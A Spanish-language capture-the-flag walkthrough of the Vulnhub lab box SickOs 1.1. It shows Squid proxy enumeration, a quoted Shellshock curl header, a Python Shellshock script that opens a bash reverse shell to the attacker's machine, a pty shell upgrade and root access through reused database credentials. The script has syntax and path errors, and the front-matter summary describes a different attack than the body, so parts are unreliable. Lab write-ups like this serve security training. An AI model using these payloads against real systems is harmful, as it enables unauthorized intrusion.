---
title: Sickos 1
author: ssanjua
datetime: 2024-09-10T17:00:12.000+00:00
slug: SickOS 1 - Vulnhub
featured: true
tags:
  - Vulnhub
  - Privilege-scalation
  - Medium
description:
  This is a Linux box that involved exploiting the PUT http method to upload a PHP script through which a reverse shell can be obtained, and then using a known vulnerability in the chkrootkit program to escalate to root.
---

- **Name**: SickOs: 1.1
- **Date release**: 11 Dec 2015
- **Author**: [D4rk](https://www.vulnhub.com/author/d4rk,199/)
- **Series**: [SickOs](https://www.vulnhub.com/series/sickos,70/)
- 
## Description

This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them

## About Release

Name........: SickOs1.1
Date Release: 11 Dec 2015
Author......: D4rk
Series......: SickOs
Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
Tester(s)...: h1tch1
Twitter.....: https://twitter.com/D4rk36

---
## Reconocimiento

Primero tratamos de reconocer la IP de nuestro objetivo con arp-scan.

```bash
sudo arp-scan -I eth0 --localnet --ignoredups
```

![Descripción](../../assets/img-content/sickOs(1).png)

Nuestro target es el: `192.168.128.132` procedemos a hacer un escaneo nmap para ver que puertos tiene abiertos y descubrimos el puerto **22** y el **3128**.

```bash
nmap -p- --open -sT -vvv --min-rate 5000 -n -Pn 192.168.128.132 -oG allPorts
```

Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
3128/tcp open  squid-http syn-ack

Datos que extraemos del reconocimiento: 
- Squid-http syn-ack
- Puertos filtrados

![Descripción](../../assets/img-content/sickOs(2).png)

Investigamos un poco sobre los **Server Squid**:

Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL. [Definicion web](https://www.squid-cache.org/)

Por lo tanto sabemos que lo que esta haciendo el puerto es servir como proxy, por lo que podemos pensar que se esta corriendo un server en el puerto 80 y que esta usando el Squid como proxy:

Intentamos hacer un curl la ip intermediando un proxy por el puerto **3128** que es el puerto abierto atraves de el servidor Squid proxy.

![Descripción](../../assets/img-content/sickOs(4).png)

![Descripción](../../assets/img-content/sickOs(5).png)

![Descripción](../../assets/img-content/sickOs(6).png)

Ahora podemos intentar listar directorios usando el proxy.

![Descripción](../../assets/img-content/sickOs(7).png)

Al descubrir un directorio **cgi-bin** nos alerta porque sabemos que si existe este es probable que estemos en presencia de una probable **Shell Shock** [ShellShock - CGI](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

Vemos si obtenemos algo mas de este dir:

![Descripción](../../assets/img-content/sickOs(10).png)
![Descripción](../../assets/img-content/sickOs(9).png)

Buscamos por la web mas información acerca de los **Shell Shock** y encontramos un viejo articulo [Shell Shock](https://blog.cloudflare.com/inside-shellshock/)

>For example, if example.com was vulnerable then

```bash
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```

Lo intentamos cambiando la instruccion, usando solo la cabecera del ejemplo:

![Descripción](../../assets/img-content/sickOs(11).png)

Efectivamente tenemos ejecución de comando, por lo que vamos a intentar obtener una **Reverse shell** atraves de un script de python:

```python
#!/user/bin/python3
    
 import sys, signal, requests
 import threading
from pwn import *

def def_handler(sig, frame):
	print("\n[!] - exiting... \n")
	sys.exit(1)
	signal.signal(signal.SIGINT, def_handler)
	main_url = "http://192.168.128.132/cgi-bin/status"
	squid_proxy = {"http": "http://192.168.128.132:3128"}

def shellshock_attack():
	headers = {'User-Agent': "() { :; };
	echo; /bin/bash -c '/bin/bash -i dev/tcp/192.168.128.131/443 0>&1'"}
	r = requests.get(main_url, headers=headers, proxies=squid_proxy) 

if __name__ == '__main__':
	try:
		threading.Thread(target=shellshock_attack, args()).start()
	except Exception as e:
		log.error(str(e))
```

Ejecutamos mientras escuchamos por el puerto que elegimos en el script:

![Descripción](../../assets/img-content/sickOs(22).png)

Lo logramos, estamos dentro de la maquina victima y podemos ejecutar comandos, ahora tenemos que escalar nuestro privilegio.

Exploramos y encontramos una info interesante dentro del config.php en /var/www/wolfcms (que estaba en el robots.txt pero decidí no explorar esa via)

Dentro de este archivo estan las credenciales para autenticarse en la base de datos, tenemos el *User* y *Password* que podemos utilizar para intentar escalar privilegios en la maquina.

- User: 'root'
- Password: 'john@123'


![Descripción](../../assets/img-content/sickOs(17).png)

La shell es antigua por lo que su googleas el output siguiente te aconsejan actualizar la shell.

![Descripción](../../assets/img-content/sickOs(18).png)

Actualizamos e intentamos autenticar con las credenciales encontradas:

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

![Descripción](../../assets/img-content/sickOs(19).png)

Pues si! Funcionó, lo intentamos de nuevo y... 

![Descripción](../../assets/img-content/sickOs(20).png)

Ya somos **root**.

![Descripción](../../assets/img-content/sickOs(21).png)

Flag encontrada!